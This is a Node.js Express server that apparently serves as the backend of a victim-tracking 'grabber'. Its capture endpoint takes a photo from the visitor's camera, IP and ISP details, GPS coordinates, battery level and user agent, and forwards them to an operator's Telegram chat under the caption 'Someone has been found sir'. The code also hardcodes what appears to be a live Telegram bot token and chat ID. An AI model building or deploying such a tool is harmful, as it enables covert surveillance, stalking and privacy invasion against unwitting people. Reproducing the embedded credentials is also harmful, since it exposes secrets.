const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');

const app = express();
app.use(cors());
app.use(express.json({ limit: '15mb' })); 

// ==========================================
// GANTI_INI: ISI DATA BOT TELEGRAM LU
const BOT_TOKEN = '8804022157:AAF9Yny0nZv1WiRtIPNkHBkOPnUJ0hQKlWw';
const ADMIN_CHAT_ID = '6437858218';
// ==========================================

const bot = new Telegraf(BOT_TOKEN);

app.post('/api/capture', async (req, res) => {
  const { image, ipData, gpsData, batteryData, userAgent, timestamp } = req.body;

  try {
    let caption = `📸 **Someone has been found sir**\n\n`;
    caption += `🕒 Time: ${timestamp}\n`;
    caption += `🔋 Battery: ${batteryData?.level || 'Unknown'} (Charging: ${batteryData?.charging || 'Unknown'})\n`;
    caption += `💻 UA: \`${userAgent}\`\n`;
    caption += `🌐 IP: \`${ipData?.query || 'Unknown'}\`\n`;
    caption += `📡 Provider/ISP: ${ipData?.org || 'Unknown'}\n`;
    caption += `📍 Location IP: ${ipData?.city || 'Unknown'}, ${ipData?.country || 'Unknown'}\n`;
    
    if (gpsData && gpsData.lat) {
      caption += `🎯 GPS Accurate: ${gpsData.lat}, ${gpsData.lng} (Akurasi: ${gpsData.accuracy}m)\n`;
      caption += `🗺️ Maps: https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n`;
    } else {
      caption += `🎯 GPS Accurate: rejected / Unavailable\n`;
    }

    if (image) {
      const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { caption: caption, parse_mode: 'Markdown' });
    } else {
      await bot.telegram.sendMessage(ADMIN_CHAT_ID, caption, { parse_mode: 'Markdown' });
    }

    res.json({ status: 'success' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/', (req, res) => res.send('Server is running.'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
